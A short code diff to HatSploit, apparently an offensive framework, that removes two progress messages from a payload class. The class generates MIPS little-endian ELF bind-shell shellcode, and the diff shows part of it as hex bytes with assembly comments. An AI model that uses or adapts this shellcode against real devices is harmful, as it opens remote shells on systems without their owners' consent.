@@ -43,7 +43,6 @@ class HatSploitPayload(Payload, HatVenom):
             'bport': bind_port
         }
 
-        self.output_process("Generating shellcode...")
         shellcode = (
             b"\xe0\xff\xbd\x27"  # addiu   sp,sp,-32
             b"\xfd\xff\x0e\x24"  # li      t6,-3
@@ -110,7 +109,5 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x0c\x01\x01\x01"  # syscall 0x40404
         )
 
-        self.output_process("Generating payload...")
         payload = self.generate('elf', 'mipsle', shellcode, offsets)
-
         return payload
